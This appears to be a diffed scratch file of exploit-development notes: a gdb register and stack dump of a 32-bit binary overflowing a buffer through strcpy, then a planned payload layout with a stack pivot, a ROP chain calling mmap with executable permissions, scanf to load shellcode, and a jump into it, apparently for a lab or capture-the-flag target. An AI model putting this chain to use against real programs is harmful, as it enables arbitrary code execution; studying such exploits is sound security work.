@@ -1,0 +1,71 @@
+0028| 0xffffc6dc --> 0xf7fb7000 --> 0x1b1db0                ***start copy strings***
+0032| 0xffffc6e0 --> 0xffffd0e8 --> 0x0
+0036| 0xffffc6e4 --> 0xf7fedf10 (pop    edx)
+0040| 0xffffc6e8 --> 0x5
+0044| 0xffffc6ec --> 0xf7e832d0 (push   esi)
+0048| 0xffffc6f0 --> 0xffffc774 ('A' <repeats 126 times>)
+0052| 0xffffc6f4 --> 0xf7fb7000 --> 0x1b1db0
+0056| 0xffffc6f8 --> 0xffffd0e8 --> 0x0                     ***EBP***
+0060| 0xffffc6fc --> 0x8048833 (add    esp,0x10)            ***end CopyStrings at main function***
+0064| 0xffffc700 --> 0xffffc774 ('A' <repeats 126 times>)
+
+ [----------------------------------registers-----------------------------------]
+ EAX: 0xffffc6dc --> 0xf7fb7000 --> 0x1b1db0
+ EBX: 0x0
+ ECX: 0x38c4
+ EDX: 0x7e ('~')
+ ESI: 0xf7fb7000 --> 0x1b1db0
+ EDI: 0xf7fb7000 --> 0x1b1db0
+ EBP: 0xffffc6f8 --> 0xffffd0e8 --> 0x0
+ ESP: 0xffffc6c0 --> 0xffffc6dc --> 0xf7fb7000 --> 0x1b1db0
+ EIP: 0x8048688 (call   0x80484a0 <strcpy@plt>)
+ EFLAGS: 0x292 (carry parity ADJUST zero SIGN trap INTERRUPT direction overflow)
+
+[-------------------------------------code-------------------------------------]
+   0x8048681:	push   DWORD PTR [ebp+0x8]
+   0x8048684:	lea    eax,[ebp-0x1c]
+   0x8048687:	push   eax
+=> 0x8048688:	call   0x80484a0 <strcpy@plt>
+   0x804868d:	add    esp,0x10
+   0x8048690:	nop
+   0x8048691:	leave
+   0x8048692:	ret
+Guessed arguments:
+arg[0]: 0xffffc6dc --> 0xf7fb7000 --> 0x1b1db0
+arg[1]: 0xffffc774 ('A' <repeats 126 times>)
+arg[2]: 0xf7fb7000 --> 0x1b1db0
+[------------------------------------stack-------------------------------------]
+
+41414141
+41414141
+41414141
+41414141
+41414141
+41414141
+41414141
+41414141
+0xffffc6fc stack pivot gadget 0xec  ESP=>0xffffc7ec
+0xffffc700 00000000
+0xffffc704 ret1
+0xffffc708 ret2
+0xffffc70c ret3
+...
+0xffffc74c ret20
+0xffffc6fc+88 mmap
+stack pivot gadget 0x1c (return address)
+shellcode addr
+0x1000 mmap para length
+7 mmap para prot
+34 mmap para flags
+-1 mmap para fd
+0 mmap para offset
+ret1
+ret2
+ret3
+ret4
+scanf
+shellcode addr
+formatstr addr
+shellcode addr
+shellcode
+
